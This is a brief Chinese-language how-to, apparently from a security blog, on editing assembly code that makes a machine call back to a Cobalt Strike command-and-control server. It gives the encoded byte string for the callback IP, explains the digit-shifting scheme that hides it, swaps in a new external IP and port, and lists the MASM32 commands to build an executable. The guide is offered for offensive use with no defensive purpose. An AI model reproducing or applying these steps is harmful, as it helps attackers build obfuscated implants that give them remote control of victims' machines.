对于汇编代码.asm
可以使用MASM32工具，链接打包成exe可执行文件

参考下篇文章，汇编上线CS：
<https://forum.butian.net/share/997>
<https://forum.butian.net/share/1536>

在已有的CS上线的汇编上修改：
```
原IP地址：
30h,2fh,2dh,30h,32h,2fh,2dh,33h,2dh,31h,2fh,33h,00h
10.130.4.204
30=1，2f=0，2d=.，32=3，33=4，31=2 依次内推
改成IP：47.94.236.117
33h,36h,2dh,38h,33h,2dh,31h,32h,35h,2dh,30h,30h,36h,00h

端口：
82=52h 改成 88=28h

替换即可

编译链接打包器MASM32：https://www.masm32.com/ 安装后bin目录下执行
编译为 obj 文件：ml /c /coff /Cp test.asm
生成 exe 文件：link /subsystem:console /libpath:c:\masm32\lib test.obj
```